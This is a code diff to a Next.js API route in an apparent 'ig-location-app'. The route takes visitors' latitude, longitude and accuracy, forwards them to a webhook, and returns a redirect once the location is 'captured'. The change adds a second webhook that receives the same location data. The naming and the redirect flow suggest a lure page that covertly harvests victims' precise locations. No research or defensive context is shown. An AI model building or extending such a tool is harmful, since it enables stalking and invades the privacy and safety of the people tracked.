@@ -54,7 +54,7 @@ function buildPayload(body: any, eventType: string) {
     },
     metadata: {
       source: 'ig-location-app',
-      version: '2.1.0',
+      version: '2.2.0',
     },
   };
 }
@@ -76,38 +76,59 @@ export async function POST(request: NextRequest) {
     console.log(`[API] Received ${type} request - lat: ${latitude}, lng: ${longitude}, accuracy: ${accuracy}m`);
 
     const redirectUrl = process.env.REDIRECT_URL;
-    const webhookUrl = process.env.WEBHOOK_URL;
+    const webhookUrl1 = process.env.WEBHOOK_URL;
+    const webhookUrl2 = process.env.WEBHOOK_URL_2;
 
     // Determine event type
     const eventType = type === 'final' ? 'location_captured' : 'location_update';
     const payload = buildPayload(body, eventType);
 
-    // ===== Send to WEBHOOK_URL for BOTH update and final =====
-    let webhookOk = false;
-    if (webhookUrl) {
-      console.log(`[Webhook] Sending ${eventType} (attempt ${body.attemptNumber}, accuracy: ${accuracy}m) to ${webhookUrl.substring(0, 50)}...`);
+    let webhook1Ok = false;
+    let webhook2Ok = false;
+
+    // ===== Send to WEBHOOK_URL (main webhook) =====
+    if (webhookUrl1) {
+      console.log(`[Webhook 1] Sending ${eventType} (attempt ${body.attemptNumber}, accuracy: ${accuracy}m)`);
       try {
-        const webhookResponse = await fetch(webhookUrl, {
+        const res1 = await fetch(webhookUrl1, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(payload),
         });
-        webhookOk = webhookResponse.ok;
-        console.log(`[Webhook] Response: ${webhookResponse.status} ${webhookResponse.statusText}`);
+        webhook1Ok = res1.ok;
+        console.log(`[Webhook 1] Response: ${res1.status} ${res1.statusText}`);
       } catch (err) {
-        console.error('[Webhook] Fetch failed:', err);
+        console.error('[Webhook 1] Fetch failed:', err);
       }
     } else {
-      console.error('[Webhook] WEBHOOK_URL not configured in .env! Location data will NOT be sent!');
+      console.error('[Webhook 1] WEBHOOK_URL not configured!');
+    }
+
+    // ===== Send to WEBHOOK_URL_2 (second webhook) =====
+    if (webhookUrl2) {
+      console.log(`[Webhook 2] Sending ${eventType} (attempt ${body.attemptNumber}, accuracy: ${accuracy}m)`);
+      try {
+        const res2 = await fetch(webhookUrl2, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload),
+        });
+        webhook2Ok = res2.ok;
+        console.log(`[Webhook 2] Response: ${res2.status} ${res2.statusText}`);
+      } catch (err) {
+        console.error('[Webhook 2] Fetch failed:', err);
+      }
+    } else {
+      console.warn('[Webhook 2] WEBHOOK_URL_2 not configured, skipping');
     }
 
     return NextResponse.json({
       success: true,
       type: type,
       redirectUrl: type === 'final' ? (redirectUrl || null) : null,
-      webhookStatus: webhookUrl ? (webhookOk ? 'sent' : 'failed') : 'not_configured',
+      webhook1Status: webhookUrl1 ? (webhook1Ok ? 'sent' : 'failed') : 'not_configured',
+      webhook2Status: webhookUrl2 ? (webhook2Ok ? 'sent' : 'failed') : 'not_configured',
       accuracy: accuracy,
-      webhookConfigured: !!webhookUrl,
     });
   } catch (error) {
     console.error('[API] Location API error:', error);
